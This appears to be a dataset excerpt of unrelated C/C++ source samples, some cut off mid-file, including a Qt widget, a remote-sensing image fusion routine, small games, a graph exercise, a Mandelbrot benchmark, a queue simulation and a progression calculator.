difference is.\n#pragma clang diagnostic ignored \"-Wsign-conversion\"                // warning: implicit conversion changes signedness\n#pragma clang diagnostic ignored \"-Wzero-as-null-pointer-constant\"  // warning: zero as null pointer constant                    // some standard header variations use #define NULL 0\n#pragma clang diagnostic ignored \"-Wcomma\"                          // warning: possible misuse of comma operator here\n#pragma clang diagnostic ignored \"-Wreserved-id-macro\"              // warning: macro name is a reserved identifier\n#pragma clang diagnostic ignored \"-Wdouble-promotion\"               // warning: implicit conversion from 'float' to 'double' when passing argument to function  // using printf() is a misery with this as C++ va_arg ellipsis changes float to double.\n#pragma clang diagnostic ignored \"-Wimplicit-int-float-conversion\"  // warning: implicit conversion from 'xxx' to 'float' may lose precision\n#pragma clang diagnostic ignored \"-Wreserved-identifier\"            // warning: identifier '_Xxx' is reserved because it starts with '_' followed by a capital letter\n#pragma clang diagnostic ignored \"-Wunsafe-buffer-usage\"            // warning: 'xxx' is an unsafe pointer used for buffer access\n#pragma clang diagnostic ignored \"-Wnontrivial-memaccess\"           // warning: first argument in call to 'memset' is a pointer to non-trivially copyable type\n#pragma clang diagnostic ignored \"-Wcast-qual\"                      // warning: cast from 'const xxxx *' to 'xxx *' drops const qualifier\n#elif defined(__GNUC__)\n#pragma GCC diagnostic ignored \"-Wpragmas\"                          // warning: unknown option after '#pragma GCC diagnostic' kind\n#pragma GCC diagnostic ignored \"-Wunused-function\"                  // warning: 'xxxx' defined but not used\n#pragma GCC diagnostic ignored \"-Wfloat-equal\"                      // warning: comparing floating-point with '==' or '!=' is unsafe\n#pragma GCC diagnostic ignored \"-Wdouble-promotion\"                 // warning: implicit conversion from 'float' to 'double' when passing argument to function\n#pragma GCC diagnostic ignored \"-Wconversion\"                       // warning: conversion to 'xxxx' from 'xxxx' may alter i",
    "\ufeff#include \"ActorWidget.h\"\n\nActorWidget::ActorWidget(QWidget *parent) : QWidget(parent)\n{\n    QVBoxLayout *layout = new QVBoxLayout();\n    this->setLayout(layout);\n    w = new QListWidget();\n    layout->addWidget(w);\n    layout->setContentsMargins(0,0,0,0);\n\n    //this->setStyleSheet(\"border: none; \");\n    w->setStyleSheet(\"border: none;\");\n    //w->setSizePolicy(QSizePolicy::Preferred, QSizePolicy::Fixed);  // \u8bbe\u7f6e\u4e3a\u53ea\u6839\u636e\u5185\u5bb9\u62c9\u4f38\u9ad8\u5ea6\n    //w->setMaximumHeight(150);  // \u6216\u8005\u660e\u786e\u8bbe\u7f6e\u6700\u5927\u9ad8\u5ea6\n}\nvoid ActorWidget::adjustListWidgetHeight()\n{\n    int totalHeight = 0;\n    for (int i = 0; i < w->count(); ++i) {\n        QListWidgetItem *item = w->item(i);\n        totalHeight += w->sizeHintForRow(i);  // \u83b7\u53d6\u6bcf\u4e00\u9879\u7684\u9ad8\u5ea6\n    }\n    w->setFixedHeight(totalHeight);  // \u6839\u636e\u6240\u6709\u9879\u7684\u603b\u9ad8\u5ea6\u8bbe\u7f6e QListWidget \u7684\u9ad8\u5ea6\n}\nvoid ActorWidget::addItem(const QString& name, std::vector<vtkSmartPointer<vtkActor>> actors) {\n    UserItemWidget *itemW = new UserItemWidget(name, actors, this);\n    QListWidgetItem* item = new QListWidgetItem();\n    item->setSizeHint(QSize(w->width(), 50));\n    item->setFlags(item->flags() & ~Qt::ItemIsSelectable);\n    w->addItem(item);\n    w->setItemWidget(item, itemW);\n    connect(itemW, &UserItemWidget::refresh, this, &ActorWidget::refresh);\n\n    // \u8c03\u6574 QListWidget \u9ad8\u5ea6\n    adjustListWidgetHeight();\n}\n\nvoid ActorWidget::removeItem(const QString& name) {\n    for (int i = 0; i < w->count(); ++i) {\n        QListWidgetItem *item = w->item(i);\n        UserItemWidget *itemW = dynamic_cast<UserItemWidget*>(w->itemWidget(item));\n        if (name == itemW->getData() || name == \"ALL\") {\n            w->removeItemWidget(item);\n            delete w->takeItem(i);\n            --i;  // \u56e0\u4e3a\u79fb\u9664\u4e86\u9879\uff0c\u8c03\u6574\u7d22\u5f15\n        }\n    }\n    // \u8c03\u6574 QListWidget \u9ad8\u5ea6\n    adjustListWidgetHeight();\n}\n\n",
    "// estarfm.cpp (combined)\n#include \"estarfm.h\"\n#include <iostream>\n#include <cstring> // Make sure to include cstring for strcmp\n#include \"gdal_priv.h\"\n#include \"gdalwarper.h\"\n#include <stdio.h>\n#include <ctime>\n#include \"cuda_runtime.h\"\n#include <cmath>\n#include <string>\n#include <vector>\n#include <algorithm>\n#include <chrono>\n#include <limits>\n#include <fstream>\n#include <sstream>\n\n\n// --- Function Implementations (ESTARFM_CPU, ESTARFM_GPU, etc.) ---\n// (All your existing code for ESTARFM_CPU, Blending2_CPU, etc. goes here)\n\n// \u8ba1\u7b97\u6807\u51c6\u5dee\nfloat Cstddve_CPU(float** a, int n, int width, int height) {\n    float Cstddve = 0, sumx = 0, sumxx = 0;\n    for (int i = 0; i < width * height; i++) {\n        sumx += a[n][i];\n        sumxx += a[n][i] * a[n][i];\n    }\n    Cstddve = sqrt(sumxx / (width * height) - (sumx / (width * height)) * (sumx / (width * height)));\n    return Cstddve;\n}\n\n// \u8ba1\u7b97\u76f8\u5173\u7cfb\u6570 (\u4e24\u4e2a\u65f6\u76f8)\nvoid limit_a_CalcuRela_CPU(float** BufferIn11, float** BufferIn22, float** BufferIn33, float** BufferIn44, float** BufferIn55, int Height, int Width, int Win_size1, float M_err, int BandNum, int current, std::vector<int>& location_p, float* r, float* threshold_d, int task_height, float _nodata) {\n\n    for (int j = 0; j < Height; j++)\n    {\n        for (int i = 0; i < Width; i++)\n        {\n            float dx, dy;\n            float sumx, sumy, sumxy, sumxx, sumyy;\n            int num = 0;\n\n            dx = 0, dy = 0;\n            num = 0;\n            sumyy = 0;\n            sumx = 0;\n            sumy = 0;\n            sumxy = 0;\n            sumxx = 0;\n\n            for (int ii = 0; ii < BandNum - 1; ii++) {\n                if (BufferIn11[ii][j * Width + i] == BufferIn11[ii + 1][j * Width + i] && BufferIn22[ii][j * Width + i] == BufferIn22[ii + 1][j * Width + i])\n                    num++;\n            }\n\n            if (num != (BandNum - 1) || (BandNum == 1)) {\n                for (int ii = 0; ii < BandNum; ii++) {\n                    sumxy = sumxy + BufferIn11[ii][j * Width + i] * BufferIn22[ii][j * Width + i] + BufferIn33[ii][j * Width + i] * BufferIn44[ii][j * Width + i];\n                    sumx = sumx + BufferIn11[ii][j * Width + i] + BufferIn33[ii][j * Width + i];\n                    sumy = sumy + BufferIn22[ii][j * Width + i] + BufferIn44[ii][j * Width + i];\n                    sumxx = sumxx + BufferIn11[ii][j * Width + i] * BufferIn11[ii][j * Width + i] + BufferIn33[ii][j * Width + i] * BufferIn33[ii][j * Width + i];\n                    sumyy = sumyy + BufferIn22[ii][j * Width + i] * BufferIn22[ii][j * Width + i] + BufferIn44[ii][j * Width + i] * BufferIn44[ii][j * Width + i];\n                }\n                dx = sqrt(sumxx / (BandNum * 2) - (sumx / (BandNum * 2)) * (sumx / (BandNum * 2)));\n                dy = sqrt(sumyy / (BandNum * 2) - (sumy / (BandNum * 2)) * (sumy / (BandNum * 2)));\n                r[j * Width + i] = (sumxy / (BandNum * 2) - sumx * sumy / (BandNum * BandNum * 4)) / (dx * dy);\n\n                if (BandNum == 1 && r[j * Width + i] > 0)\n                    r[j * Width + i] = 1;\n                if (BandNum == 1 && r[j * Width + i] < 0)\n                    r[j * Width + i] = -1;\n            }\n            else {\n                r[j * Width + i] = 1;\n            }\n\n            if (r[j * Width + i] != r[j * Width + i])\n                r[j * Width + i] = 0;\n        }\n    }\n}\n\n// \u878d\u5408 (\u4e24\u4e2a\u65f6\u76f8)\nvoid Blending2_CPU(float** BufferIn11, float** BufferIn22, float** BufferIn33, float** BufferIn44, float** BufferIn55, float** BufferOut, int Height, int Width, int Win_size1, float M_err, int BandNum, int current, std::vector<int>& location_p, float* r, float* threshold_d, int task_height, float _nodata) {\n\n    for (int j = current; j < current + task_height; j++)\n    {\n        for (int i = 0; i < Width; i++)\n        {\n            int rmin, rmax, smin, smax;\n            int r1, s1;\n            int Result1 = 0, m = 0;\n            int n1;\n            float dy;\n            float sum, weight_all, weight;\n            float aa = 0;\n            float pix_sum1, pix_sum2;\n            double Aver11;\n            double Aver22;\n            float Average1[10], Average2[10], Average3[10], Average4[10];\n            float d = 0;\n            float sumx, sumy, sumxy, sumxx, sumyy;\n            float T1_weight;\n            float T2_weight;\n\n            aa = 0;\n            pix_sum1 = 0;\n            pix_sum2 = 0;\n            for (m = 0; m < 10; m++) {\n                Average1[m] = 0;\n                Average2[m] = 0;\n                Average3[m] = 0;\n                Average4[m] = 0;\n            }\n\n            for (m = 0; m < BandNum; m++) {\n                pix_sum1 += BufferIn11[m][i + Width * j];\n                pix_sum2 += BufferIn33[m][i + Width * j];\n            }\n\n            if (fabs(pix_sum1 - _nodata * BandNum) > 1e-6 && fabs(pix_sum2 - _nodata * BandNum) > 1e-6) {\n                n1 = 0;\n                weight_all = 0, weight = 0;\n                sum = 0;\n                sumx = 0;\n                Aver11 = 0;\n                Aver22 =",
    "//Pawe\u0142 Rogowski, 203762, EiT, Gra \u00e0 la Kono\n#include <iostream>\n#include <ctime>\n#include <cstdlib>\n#include <chrono>\n#include <fstream>\n\nusing namespace std;\nusing namespace chrono;\n\n\n\n\nvoid ustawienie_pionkow(char *tablica, char komputer, char gracz);\nvoid plansza(char *tablica);\nint wartosc_indexu (char *pole);\nvoid czyszczenie_tablicy();\nvoid logika_ruchu(char *tablica, char sojusznik, char przeciwnik, int id1, int id2);\nvoid ruch(char *tablica, char sojusznik, int id1, int id2);\nvoid bicie(char *tablica, char sojusznik, int id1, int id2);\nbool czy_ruch_mozliwy (char *tablica, char sojusznik, int id1, int id2);\nbool czy_bicie_mozliwe (char *tablica, char sojusznik, char przeciwnik, int id1, int id2);\nvoid ruch_komputera (char *tablica, char komputer, char gracz);\nvoid zagraj_komputer (char *tablica, char komputer, char gracz);\nbool czy_gracz_ma_pionki (char *tablica, char gracz);\nbool czy_gracz_ma_ruch (char *tablica, char sojusznik, char przeciwnik);\nbool czy_gra_skonczona (char *tablica, char sojusznik, char przeciwnik, char* nazwa_gracza, char* nazwa_komputera);\nvoid opoznienie(int sekunda);\nvoid zapisanie_rundy_opcja_undo(int runda, char *tablica, char *tablica_historia);\nvoid undo(int ile_ruchow, char *tablica, char *tablica_historia);\nvoid zapisz_runde_do_historii(const char* tablica, const char* gracz, int id_start_ruchu, int id_koniec_ruchu);\nvoid wyswietl_runde_z_historii(int numer_rundy);\nvoid przegladaj_rozgrywke();\n\n\nint czas_komputera;\nint czas_gracza;\nbool ruch_uzytkownika = false;\n\n\n\n\nint main() {\n    char komputer = 'b';\n    char gracz = 'c';\n    bool czy_program_dziala = true;\n    char tablica[17] = {' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', '\\0'};\n    char nazwa_gracza[30] = {0}, nazwa_komputer[30] = {0}, pole[3] = {0};\n    int id1, id2, runda = 1;\n    int ile_ruchow;\n    char tablica_historia[16 * 5];\n    for (int i = 0; i < 5*16; i++) {\n        tablica_historia[i] = '-';\n    }\n\n\n    ofstream outFile(\"historia_rozgrywki.txt\");\n    outFile.close();\n\n    cout << \"podaj czas rozgrywki dla komputera (w sekundach): \";\n    cin >> czas_komputera;\n    cin.ignore();\n    cout << \"podaj czas rozgrywki dla uzytkownika (w sekundach): \";\n    cin >> czas_gracza;\n    cin.ignore();\n\n    cout << endl;\n\n    cout << \"podaj nazwe komputera: \";\n    cin.getline(nazwa_komputer, 30);\n    cout << \"podaj nazwe gracza: \";\n    cin.getline(nazwa_gracza, 30);\n\n\n     cout << \"poczatkowe ustawienie: \" << endl;\n     ustawienie_pionkow(tablica, komputer, gracz);\n     plansza(tablica);\n    opoznienie(2);\n\n     do {\n         cout << \"runda: \" << runda << endl;\n\n\n         if (!ruch_uzytkownika) {\n             cout << \"ruch gracza: \" << nazwa_komputer << \", jadacy kolorem bialym\" << endl;\n             cout << \"pozostalo \" << czas_komputera << \" sekund\" << endl;\n\n\n             high_resolution_clock::time_point start_computer_timestamp = high_resolution_clock::now();\n             zagraj_komputer(tablica, komputer, gracz);\n             plansza(tablica);\n\n             high_resolution_clock::time_point end_computer_timestamp = high_resolution_clock::now();\n             int elapsed_computer_time = duration_cast<seconds>(end_computer_timestamp - start_computer_timestamp).count();\n             czas_komputera -= elapsed_computer_time;\n\n             if (czy_gra_skonczona(tablica, gracz, komputer, nazwa_gracza, nazwa_komputer)) {\n                 czy_program_dziala = false;\n             }\n         }\n\n\n\n         cout << \"ruch gracza: \" << nazwa_gracza << \", jadacy kolorem czarnym\" << endl;\n         cout << \"pozostalo \" << czas_gracza << \" sekund\" << endl;\n\n         high_resolution_clock::time_point start_user_timestamp = high_resolution_clock::now();\n\n         cout << \"wprowadz indeks pionka, ktorym chcesz ruszyc: \";\n         cin >> pole;\n         id1 = wartosc_indexu(pole);\n\n         cin.ignore();\n\n         cout << \"Dokad chcesz jechac: \";\n         cin >> pole;\n         id2 = wartosc_indexu(pole);\n\n         logika_ruchu(tablica, gracz, komputer, id1, id2);\n         zapisz_runde_do_historii(tablica, nazwa_gracza, id1, id2);\n\n         cout << endl;\n         plansza(tablica);\n\n         zapisanie_rundy_opcja_undo(runda, tablica, tablica_historia);\n         high_resolution_clock::time_point end_user_timestamp = high_resolution_clock::now();\n         int elapsed_user_time = duration_cast<seconds>(end_user_timestamp - start_user_timestamp).count();\n         czas_gracza -= elapsed_user_time;\n         ruch_uzytkownika = false;\n\n         if (czy_gra_skonczona(tablica, komputer, gracz, nazwa_gracza, nazwa_komputer)) {\n             czy_program_dziala = false;\n         }\n\n         if (czy_program_dziala) {\n             cout << \"Czy chcesz cofnac ruch? (y/n): \";\n             char opcja;\n             cin >> opcja;\n             if (opcja == 'y' || opcja == 'Y') {\n                 bool niepoprawny_ruch = true;\n                 do {\n                     cout << \"podaj ile ruchow chcesz cofnac (wpisz 0, aby wyjsc)",
    "#ifdef WINDOWS\n  #define SDL_MAIN_HANDLED\n  #include <SDL.h>\n  #include <SDL_image.h>\n  #include <SDL_ttf.h>\n  #include <SDL_mixer.h>\n#else\n  #include <SDL2/SDL.h>\n  #include <SDL2/SDL_image.h>\n  #include <SDL2/SDL_ttf.h>\n  #include <SDL2/SDL_mixer.h>\n#endif \n\n#include <cmath>\n#include \"Player.h\"\n#include <iostream>\n#include <string>\n#include \"../Constants.h\"\nusing namespace std;\n\nPlayer::Player(SDL_Renderer* renderer, int x, int y, int width, int height, int vx, int vy, int maxSpeed, float scale, string imageBasePath)\n    : GameObject(renderer, x, y, width, height, vx, vy, maxSpeed, scale), imageBasePath(imageBasePath), currImageDisplayedFrameCount(0),  FRAMES_PER_IMAGE(60), angle(0), MAX_ANGULAR_VELOCITY(30.0) {\n        textureImage1 = loadImage(imageBasePath + \"1.png\");\n        textureImage2 = loadImage(imageBasePath + \"2.png\");\n        currTexture = textureImage1;\n}\n\nPlayer::~Player() {\n    if (textureImage1) {\n        SDL_DestroyTexture(textureImage1);\n    }\n    if (textureImage2) {\n        SDL_DestroyTexture(textureImage2);\n    }\n}\n\nvoid Player::draw() {\n    SDL_Rect rect = { x, y, static_cast<int>(width * scale), static_cast<int>(height * scale)};\n    if (vx != 0 || vy != 0) {\n        if (currImageDisplayedFrameCount >= FRAMES_PER_IMAGE) {\n            currTexture = currTexture == textureImage1 ? textureImage2 : textureImage1;\n            currImageDisplayedFrameCount = 0;\n        } else {\n            currImageDisplayedFrameCount++;\n        }\n    } else {\n        if (currTexture != textureImage1) {\n            currTexture = textureImage1;\n        }\n        currImageDisplayedFrameCount = 0;\n    }\n    SDL_RenderCopyEx(renderer, currTexture, NULL, &rect, angle, NULL, SDL_FLIP_NONE);\n}\n\nvoid Player::setVelocityComponents() {\n    double angleRad = (fmod((double) angle, 360.0)) * M_PI / 180.0;\n    vx = ((double) currSpeed) * sin(angleRad);\n    vy = -((double) currSpeed) * cos(angleRad); // negative goes up\n\n    if (x < 0) x = 0;\n    if (x + scaledWidth > SCREEN_WIDTH) x = SCREEN_WIDTH - scaledWidth;\n    if (y < 0) y = 0;\n    if (y + scaledHeight > SCREEN_HEIGHT) y = SCREEN_HEIGHT - scaledHeight;\n}\n\nvoid Player::move(const SDL_Event& e) {\n    if (e.type == SDL_KEYDOWN) {\n        if (e.key.keysym.sym == SDLK_w) {\n            currSpeed = maxSpeed;\n        }\n        if (e.key.keysym.sym == SDLK_s) {\n            currSpeed = -maxSpeed;\n        }\n        if (e.key.keysym.sym == SDLK_a) {\n            angle -= MAX_ANGULAR_VELOCITY;\n        }\n        if (e.key.keysym.sym == SDLK_d) {\n            angle += MAX_ANGULAR_VELOCITY;\n        }\n    } else if (e.type == SDL_KEYUP) {\n        switch (e.key.keysym.sym) {\n            case SDLK_w:\n            case SDLK_s:\n                currSpeed = 0;\n                break;\n        }\n    }\n\n    setVelocityComponents();\n\n    x += vx;\n    y += vy;\n\n}\n",
    "#include <iostream>\r\nusing namespace std; \r\n//H\u00e0 N\u1ed9i: 0, H\u00f2a B\u00ecnh: 1, S\u01a1n T\u00e2y: 2, Th\u00e1i Nguy\u00ean: 3, B\u1eafc Ninh: 4, H\u1ea3i D\u01b0\u01a1ng: 5, H\u01b0ng Y\u00ean: 6, Ph\u1ee7 l\u00fd: 7.\r\n//B\u1eafc Giang :8, U\u00f4ng B\u00ed: 9, H\u1ea3i Ph\u00f2ng: 10.\r\n\r\nstruct node {\r\n    int dinh;\r\n    node* next;\r\n};\r\n\r\nstruct graph {\r\n    int so_dinh;\r\n    int* Ma_tran;\r\n    node* Danh_sach;\r\n\r\n    graph(int vertices) {\r\n        so_dinh = vertices;\r\n\r\n        Ma_tran = new int[so_dinh * so_dinh];\r\n        for (int i = 0; i < so_dinh * so_dinh; i++) {\r\n            Ma_tran[i] = 0;\r\n        }\r\n\r\n \r\n        Danh_sach = new node[so_dinh];\r\n        for (int i = 0; i < so_dinh; i++) {\r\n            Danh_sach[i].dinh = i;\r\n            Danh_sach[i].next = NULL;\r\n        }\r\n    }\r\n\r\n    ~graph() {\r\n        delete[] Ma_tran;\r\n        for (int i = 0; i < so_dinh; i++) {\r\n            node* current = Danh_sach[i].next;\r\n            while (current != NULL) {\r\n                node* temp = current;\r\n                current = current->next;\r\n                delete temp;\r\n            }\r\n        }\r\n        delete[] Danh_sach;\r\n    }\r\n\r\n    void addEdgeMatrix(int u, int v) {\r\n        Ma_tran[u * so_dinh + v] = 1;\r\n        Ma_tran[v * so_dinh + u] = 1; \r\n    }\r\n\r\n    void displayMatrix() {\r\n        cout << \"Ma tr\u1eadn k\u1ec1:\" << endl;\r\n        for (int i = 0; i < so_dinh; i++) {\r\n            for (int j = 0; j < so_dinh; j++) {\r\n                cout << Ma_tran[i * so_dinh + j] << \" \";\r\n            }\r\n            cout << endl;\r\n        }\r\n    }\r\n\r\n    void addEdgeList(int u, int v) {\r\n        node* newnode = new node{v, Danh_sach[u].next};\r\n        Danh_sach[u].next = newnode;\r\n\r\n        newnode = new node{u, Danh_sach[v].next};\r\n        Danh_sach[v].next = newnode; \r\n    }\r\n\r\n    void displayList() {\r\n        cout << \"Danh s\u00e1ch k\u1ec1:\" << endl;\r\n        for (int i = 0; i < so_dinh; i++) {\r\n            cout << i << \": \";\r\n            node* current = Danh_sach[i].next;\r\n            while (current != NULL) {\r\n                cout << current->dinh << \" \";\r\n                current = current->next;\r\n            }\r\n            cout << endl;\r\n        }\r\n    }\r\n};\r\n\r\nint main() {\r\n    graph g(11); \r\n//Ma tr\u1eadn k\u1ec1\r\n    g.addEdgeMatrix(0, 1);\r\n    g.addEdgeMatrix(0, 2);\r\n    g.addEdgeMatrix(0, 3);\r\n    g.addEdgeMatrix(0, 4);\r\n    g.addEdgeMatrix(0, 5);\r\n    g.addEdgeMatrix(0, 7);\r\n    g.addEdgeMatrix(4, 8);\r\n    g.addEdgeMatrix(4, 9);\r\n    g.addEdgeMatrix(5, 6);\r\n    g.addEdgeMatrix(5, 10);\r\n    g.addEdgeMatrix(6, 7);\r\n    g.addEdgeMatrix(8, 9);\r\n    g.addEdgeMatrix(9, 10);\r\n    g.displayMatrix();\r\n//Danh s\u00e1ch k\u1ec1\r\n    g.addEdgeList(0, 1);\r\n    g.addEdgeList(0, 2);\r\n    g.addEdgeList(0, 3);\r\n    g.addEdgeList(0, 7);\r\n    g.addEdgeList(4, 8);\r\n    g.addEdgeList(4, 9);\r\n    g.addEdgeList(5, 6);\r\n    g.addEdgeList(5, 10);\r\n    g.addEdgeList(6, 7);\r\n    g.addEdgeList(8, 9);\r\n    g.addEdgeList(9, 10);\r\n    g.displayList();\r\n\r\n    return 0;\r\n}\r\n",
    "#include <stdio.h>\n#include <algorithm>\n#include <getopt.h>\n\n#include \"CycleTimer.h\"\n\nextern void mandelbrotSerial(\n    float x0, float y0, float x1, float y1,\n    int width, int height,\n    int startRow, int numRows,\n    int maxIterations,\n    int output[]);\n\nextern void mandelbrotThread(\n    float x0, float y0, float x1, float y1,\n    int width, int height,\n    int maxIterations,\n    int output[]);\n\nextern void mandelbrotThreadRef(\n    float x0, float y0, float x1, float y1,\n    int width, int height,\n    int maxIterations,\n    int output[]);\n\nextern void writePPMImage(\n    int *data,\n    int width, int height,\n    const char *filename,\n    int maxIterations);\n\nvoid scaleAndShift(float &x0, float &x1, float &y0, float &y1,\n                   float scale,\n                   float shiftX, float shiftY)\n{\n\n    x0 *= scale;\n    x1 *= scale;\n    y0 *= scale;\n    y1 *= scale;\n    x0 += shiftX;\n    x1 += shiftX;\n    y0 += shiftY;\n    y1 += shiftY;\n}\n\nvoid usage(const char *progname)\n{\n    printf(\"Usage: %s [options]\\n\", progname);\n    printf(\"Program Options:\\n\");\n    printf(\"  -i  --iter <INT>       Use specified interation (>=256)\\n\");\n    printf(\"  -v  --view <INT>       Use specified view settings (1 or 2)\\n\");\n    printf(\"  -g  --gpu-only <INT>   Only run GPU or not (1 or 0)\\n\");\n    printf(\"  -?  --help             This message\\n\");\n}\n\nbool verifyResult(int *gold, int *result, int width, int height)\n{\n\n    int i, j;\n\n    for (i = 0; i < height; i++)\n    {\n        for (j = 0; j < width; j++)\n        {\n            if (abs(gold[i * width + j] - result[i * width + j]) > 0)\n            {\n                printf(\"Mismatch : [%d][%d], Expected : %d, Actual : %d\\n\",\n                       i, j, gold[i * width + j], result[i * width + j]);\n                return 0;\n            }\n        }\n    }\n\n    return 1;\n}\n\nint main(int argc, char **argv)\n{\n\n    const unsigned int width = 1600;\n    const unsigned int height = 1200;\n    int maxIterations = 256;\n    bool isGPUOnly = false;\n\n    float x0 = -2;\n    float x1 = 1;\n    float y0 = -1;\n    float y1 = 1;\n\n    // parse commandline options ////////////////////////////////////////////\n    int opt;\n    static struct option long_options[] = {\n        {\"iter\", 1, 0, 'i'},\n        {\"view\", 1, 0, 'v'},\n        {\"gpu-only\", 1, 0, 'g'},\n        {\"help\", 0, 0, '?'},\n        {0, 0, 0, 0}};\n\n    while ((opt = getopt_long(argc, argv, \"i:v:g:?\", long_options, NULL)) != EOF)\n    {\n\n        switch (opt)\n        {\n        case 'i':\n        {\n            int iter = atoi(optarg);\n            if (iter < 256)\n            {\n                fprintf(stderr, \"Iteration should >= 256\\n\");\n                return 1;\n            }\n            maxIterations = iter;\n            break;\n        }\n        case 'v':\n        {\n            int viewIndex = atoi(optarg);\n            // change view settings\n            if (viewIndex == 2)\n            {\n                float scaleValue = .015f;\n                float shiftX = -.986f;\n                float shiftY = .30f;\n                scaleAndShift(x0, x1, y0, y1, scaleValue, shiftX, shiftY);\n            }\n            else if (viewIndex > 1)\n            {\n                fprintf(stderr, \"Invalid view index\\n\");\n                return 1;\n            }\n            break;\n        }\n        case 'g':\n        {\n            int flag = atoi(optarg);\n            // change GPU settings\n            if (flag == 1 || flag == 0)\n            {\n                isGPUOnly = flag;\n            }\n            else\n            {\n                fprintf(stderr, \"Invalid setting. Only allow 0 or 1.\\n\");\n                return 1;\n            }\n            break;\n        }\n        case '?':\n        default:\n            usage(argv[0]);\n            return 1;\n        }\n    }\n    // end parsing of commandline options\n\n    int *output_test = new int[width * height];\n    int *output_thread = new int[width * height];\n\n    //\n    // Run the serial implementation.  Run the code three times and\n    // take the minimum to get a good estimate.\n    //\n    double minSerial = 1e30;\n    if (!isGPUOnly)\n    {\n        for (int i = 0; i < 5; ++i)\n        {\n            memset(output_test, 0, width * height * sizeof(int));\n            double startTime = CycleTimer::currentSeconds();\n            mandelbrotSerial(x0, y0, x1, y1, width, height, 0, height, maxIterations, output_test);\n            double endTime = CycleTimer::currentSeconds();\n            minSerial = std::min(minSerial, endTime - startTime);\n        }\n\n        printf(\"[mandelbrot serial]:\\t\\t[%.3f] ms\\n\", minSerial * 1000);\n    }\n\n    //\n    // Run the reference threaded version\n    //\n\n    double minRef = 0;\n    double recordRef[10] = {0};\n    for (int i = 0; i < 10; ++i)\n    {\n        memset(output_thread, 0, width * height * sizeof(int));\n        double startTime = CycleTimer::currentSeconds();\n        mandelbrotThreadRef(x0, y0, x1, y1, width, height, maxIterations, output_test);\n        double endTime = CycleTimer::currentSeconds();\n        ",
    "#include <simlib.h>\n#include <iostream>\n#include <getopt.h>\n#include <stdexcept>\n\ndouble A, B, X;\nint counter = 0;\n\n// M/M/1, kazdych exp(4h) udrzbar, pokud 10 obsluh od jeho posledni navstevy,\n// tak pocka na dokonceni prave probihajici obsluhy a zahaji udrzbu na 20MIN\n// jinak pokracuje v obchuzce\n\nFacility linka(\"linka\");\n\nclass Udrzbar : public Process {\n    void Behavior() {\n        while(1) {\n            Wait(Exponential(4));\n            if(counter == 10) {\n                Priority = 100;\n                Seize(linka);\n                Wait(20);\n                Release(linka);\n            }\n            counter = 0;\n\n        }\n    }\n};\n\nclass Rob_neco : public Process {\n    void Behavior() {\n\n        Seize(linka);\n\n        Wait(Exponential(B));\n\n        Release(linka);\n        counter++;\n    }\n};\n\nclass Generator : public Event {\n    void Behavior() {\n        (new Rob_neco)->Activate();\n        Activate(Time + Exponential(A));\n    }\n};\n\nint main() {\n    Init(1000);\n\n    (new Udrzbar)->Activate();\n    (new Generator)->Activate();\n    Run();\n}",
    "#include <iostream>\n#include <cmath> //This libray is used to extract maths functions like square,cube etc.\n#include <bits/stdc++.h> //This library is used to extract complex maths function like  log(), dy/dx.\nusing namespace std;\n\nint main()\n{\n    int input, input_AP = 1, input_GP = 2, input1, input2;\n    float first_term, no_of_terms, common_difference, nth_term, sum, common_ratio;\n\n    cout << \" 1. Arithmetic Progessiion.\\n 2. Geometric Progession.\\n\";\n    cout << \"\\n Which calculation you want to perform: \";\n    cin >> input;\n\n    if (input == input_AP)\n    {\n        cout << endl\n             << \" 1. Calculate first term.\\n 2. Calculate no of terms.\\n 3. Calculate common difference.\\n 4. Calculate n(th) term.\\n 5. Calculate sum of nth terms of AP.\\n\";\n\n        cout << \"\\nWhich calculation you want to perform of Arithmetic Progession: \";\n        cin >> input1;\n\n        switch (input1) //Creating a switch statement.\n        {\n        case 1:\n            if (input1 == 1)\n            {\n                cout << \"\\nEnter no of terms: \";\n                cin >> no_of_terms;\n\n                cout << \"Enter the common difference: \";\n                cin >> common_difference;\n\n                cout << \"Enter the (tn) nth term: \";\n                cin >> nth_term;\n\n                first_term = nth_term - ((no_of_terms - 1) * common_difference); //This calculates the first term of an AP.\n                cout << \"\\nThe first term of AP is \" << first_term;\n                break;\n            }\n\n        case 2:\n            if (input1 == 2)\n            {\n                cout << \"\\nEnter n(th) term: \";\n                cin >> nth_term;\n\n                cout << \"Enter the common difference: \";\n                cin >> common_difference;\n\n                cout << \"Enter first term: \";\n                cin >> first_term;\n\n                no_of_terms = ((nth_term - first_term) / common_difference) + 1; //This calculates the no of terms of an AS.\n                cout << \"\\nThe number of terms in AP is \" << no_of_terms;\n                break;\n            }\n\n        case 3:\n            if (input1 == 3)\n            {\n                cout << \"\\nEnter n(th) term: \";\n                cin >> nth_term;\n\n                cout << \"Enter the number of terms: \";\n                cin >> no_of_terms;\n\n                cout << \"Enter first term: \";\n                cin >> first_term;\n\n                common_difference = (nth_term - first_term) / (no_of_terms - 1); //This calculates the common difference.\n                cout << \"\\nThe common difference of AP is \" << common_difference;\n                break;\n            }\n\n        case 4:\n            if (input1 == 4)\n            {\n                cout << \"\\nEnter first term: \";\n                cin >> first_term;\n\n                cout << \"Enter the common difference: \";\n                cin >> common_difference;\n\n                cout << \"Enter the number of terms: \";\n                cin >> no_of_terms;\n\n                nth_term = first_term + ((no_of_terms - 1) * common_difference); //This calculates the n(th) term of an squence.\n                cout << \"\\nThe n(th) term of AP is \" << nth_term;\n                break;\n            }\n\n        case 5:\n            if (input1 == 5)\n            {\n                cout << \"\\nEnter common difference: \";\n                cin >> common_difference;\n\n                cout << \"Enter the number of terms: \";\n                cin >> no_of_terms;\n\n                cout << \"Enter first term: \";\n                cin >> first_term;\n\n                sum = (no_of_terms / 2) * (2 * first_term + (no_of_terms - 1) * common_difference); //This calculates the sum of AP.\n                cout << \"\\nThe total sum of an AP is \" << sum;\n                break;\n            }\n        }\n    }\n\n    if (input == input_GP)\n    {\n        cout << \"\\n 1. Calculate first term.\\n 2. Calculate no of terms.\\n 3. Calculate common ratio.\\n 4. Calculate n(th) term.\\n 5. Calculate sum of nth terms of GP.\\n\";\n\n        cout << \"\\nWhich calculation you want to perform from Geometric Progession: \";\n        cin >> input2;\n\n        switch (input2)\n        {\n        case 1:\n            if (input2 == 1)\n            {\n                cout << \"\\nEnter no of terms: \";\n                cin >> no_of_terms;\n\n                cout << \"Enter the common ratio: \";\n                cin >> common_ratio;\n\n                cout << \"Enter the (tn) nth term: \";\n                cin >> nth_term;\n\n                first_term = nth_term / 